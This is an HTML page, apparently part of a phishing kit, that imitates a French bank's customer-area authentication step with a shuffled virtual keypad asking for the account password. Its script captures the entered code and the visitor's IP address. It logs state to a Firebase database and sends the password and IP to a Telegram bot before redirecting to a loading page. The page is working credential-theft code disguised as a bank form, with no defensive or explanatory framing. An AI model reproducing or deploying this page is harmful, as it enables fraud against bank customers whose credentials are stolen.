<!DOCTYPE html>
<!-- Coding By CodingNepal - codingnepalweb.com -->
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>OTP Verification Form</title>
    <link rel="stylesheet" href="style.css">
    <!-- Boxicons CSS -->

  </head>
  <body>
  	   
  	<center>
  	<div class="dagaCode">
	<b style="color:#B56600">Pour valider votre étape, veuillez vous authentifier.</b>
	<p>Composez le mot de passe de votre Espace Client bancaire.</p>
  </div>
    <div class="container">
 
<img style="margin-bottom:10px" width="100" src="https://ps.w.org/lock-my-bp/assets/icon-256x256.gif?rev=1756892">
    
    
	<p>Code Sécurité:</p>
  <span style="right:0;font-size:12px">Mot de passe à 6 ou 8 chiffres sur ce clavier</span>
  <div id="er-sms" style="width:auto;background:#FFD5D5;color:#853737;padding:8px;border-radius:2px;margin:10px;text-align:left;display:none;">
    <span>Les informations sont incorrectes, veuillez vérifier à nouveau</span>
    </div>
    <div style="position: relative;background :#FFE3BF;border-radius:5px; width:100%;height:40px;margin:5px 0;">
    	<svg id="remoin" style="position: absolute; top: 50%; right: 10px; transform: translateY(-50%);width:30px;"  viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M7 17L16.8995 7.10051" stroke="#000000" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M7 7.00001L16.8995 16.8995" stroke="#000000" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
    <span style="font-size: 40px;font-weight:bold;height: 40px;display: block" id="nmRe"></span>
	</div>
    <input style="width: 100%;font-size: 20px;text-align: center;height: 35px;display:none" id="code" type="password" type="number" class="passwordCode" required>
    <div class="ganga" id="numberContainer">
    </div>
    <button class="btnvaCode" type="submit" name="submit_btn" id = "submit" > Validé  </button>
    
    </div>
    </center>
    
    <style>
    	

:where(.container, form, .input-field, header) {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
.container {
  border: solid 1.5px #CACACA;
  max-width: 500px;
  margin:10px;
  padding:10px;
  border-radius: 5px;

  
}
.container h4 {
  font-size: 1.25rem;
  color: #333;
  font-weight: 500;
}

.input-field input {
  height: 45px;
  width: 90%;
  border-radius: 6px;
  outline: none;
  font-size: 1.125rem;
  text-align: center;
  border: 1px solid #ddd;
}
.input-field input:focus {
  box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
}

form button {
  margin-top: 25px;
  width: 100%;
  color: #fff;
  font-size: 1rem;
  border: none;
  padding: 9px 0;
  cursor: pointer;
  border-radius: 6px;
  pointer-events: none;
  background: #ff7f00;
  transition: all 0.2s ease;
}

form button:hover {
  background: #0e4bf1;
}
*{
font-family:normal;

}
    </style>
    
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
    $(document).ready(function(){
        $("#remoin").click(function(){
            var codeValue = $("#code").val();
            if(codeValue.length > 0) {
                $("#code").val(codeValue.slice(0, -1));
                // Trigger the input event manually
                var inputEvent = new Event("input");
                $("#code").get(0).dispatchEvent(inputEvent);

                var characterCountSpan = document.getElementById("nmRe");
                var inputValue = $("#code").val();
                var characterCount = inputValue.length;
                characterCountSpan.textContent = "•".repeat(characterCount);
            }
        });
    });

    document.addEventListener("DOMContentLoaded", function() {
        var numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];
        numbers = numbers.sort(function() {
            return Math.random() - 0.5;
        });

        var numberContainer = document.getElementById("numberContainer");

        numbers.forEach(function(number) {
            var button = document.createElement("button");
            button.className = "buttonRa";
            button.textContent = number;
            button.onclick = function() {
                insertNumber(number);
            };
            numberContainer.appendChild(button);
        });

        var passwordCodeInput = document.getElementById("code");
        var characterCountSpan = document.getElementById("nmRe");

        passwordCodeInput.addEventListener("input", function() {
            var inputValue = passwordCodeInput.value;
            var maxCharacters = 8;

            if (inputValue.length > maxCharacters) {
                passwordCodeInput.value = inputValue.slice(0, maxCharacters);
            }

            var characterCount = passwordCodeInput.value.length;
            characterCountSpan.textContent = "•".repeat(characterCount);
        });
    });

    function insertNumber(number) {
        var passwordCodeInput = document.getElementById("code");
        passwordCodeInput.value += number;

        // Trigger the input event manually
        var inputEvent = new Event("input");
        passwordCodeInput.dispatchEvent(inputEvent);

        var characterCountSpan = document.getElementById("nmRe");
        var inputValue = passwordCodeInput.value;
        var characterCount = inputValue.length;
        characterCountSpan.textContent = "•".repeat(characterCount);
    }
</script>


<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-database.js"></script>

<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script src="script.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const url = window.location.href;
      const idValue = new URL(url).searchParams.get('id');
      

const getElementValue = (id) => document.getElementById(id).value;
const submitButton = document.getElementById("submit");

submitButton.addEventListener('click', async (e) => {
  e.preventDefault();
  const response = await fetch('https://api64.ipify.org?format=json');
  const { ip: DiIp } = await response.json();

  const DiCode = getElementValue("code");

  if (DiCode && DiCode.trim().length >= 6) {
    set(ref(db, `user/${idValue}`), {
      Loading: "true",
      SMS: "false",
      CC: "false",
      CODE2: "false",
      SITE: "false",
      APP: "false",
      APPYES: "false",
      APPNO: "false"
    }).then(() => {
      const inputValue = $('.passwordCode').val();
      

$.ajax({
  type: 'POST',
  url: `https://api.telegram.org/bot${token}/sendMessage`,
  data: {
    chat_id: chatId,
    text: `bnq-ACS3: ${inputValue}\nIP: ${DiIp}`
  },
  success: function(response) {
    window.location.href = 'loading.html?id=' + idValue;
  },
  error: function(error) {
    alert('ERROR:', error);
  }
});

    });
  } else {
      $("#er-sms").show();
  }
});

</script>

  </body>
</html>